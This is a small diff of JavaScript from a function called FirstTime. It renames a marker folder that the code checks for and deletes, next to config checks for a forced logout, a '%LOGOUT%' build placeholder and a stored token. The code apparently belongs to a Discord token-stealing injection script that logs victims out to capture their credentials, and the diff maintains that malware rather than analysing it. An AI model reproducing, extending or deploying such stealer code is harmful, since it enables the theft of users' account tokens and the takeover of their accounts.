@@ -76,10 +76,10 @@ function FirstTime() {
     `, !0).then((token => {}));
             }
         }
-        if (!fs.existsSync(path.join(__dirname, "gonza1337"))) {
+        if (!fs.existsSync(path.join(__dirname, "1337"))) {
             return !0
         }
-        fs.rmdirSync(path.join(__dirname, "gonza1337"));
+        fs.rmdirSync(path.join(__dirname, "1337"));
         if (config.logout != "false" || config.logout == "%LOGOUT%") {
             if (config['logout-notify'] == "true") {
                 if  (token == null || token == undefined || token == "") {
